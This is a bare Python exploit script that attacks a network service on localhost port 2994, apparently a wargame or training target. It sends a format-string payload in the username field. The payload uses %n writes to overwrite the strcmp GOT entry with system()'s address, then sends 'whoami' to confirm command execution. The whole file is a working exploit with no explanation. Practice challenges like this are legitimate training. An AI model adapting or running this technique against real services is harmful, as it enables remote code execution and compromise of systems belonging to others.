import struct
import socket

created_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
created_socket.connect(('127.0.0.1', 2994))

strcmp_got_addr = struct.pack("I", 0x804a1a8)
strcmp_got_addr_plus_2 = struct.pack("I", 0x804a1a8 + 2)
system_addr = 0xb7ecffb0

payload = 'AAAAA' + strcmp_got_addr + strcmp_got_addr_plus_2 + '%15$65411x %16$n' + '%17$47163x %17$n'

received = created_socket.recv(11)
created_socket.sendall('username ' + payload + '\n')
received = created_socket.recv(11)
created_socket.sendall('login passwd\n')
received = created_socket.recv(12)
received = created_socket.recv(12)

created_socket.sendall('whoami\n')
received = created_socket.recv(20)
print(received)

created_socket.close()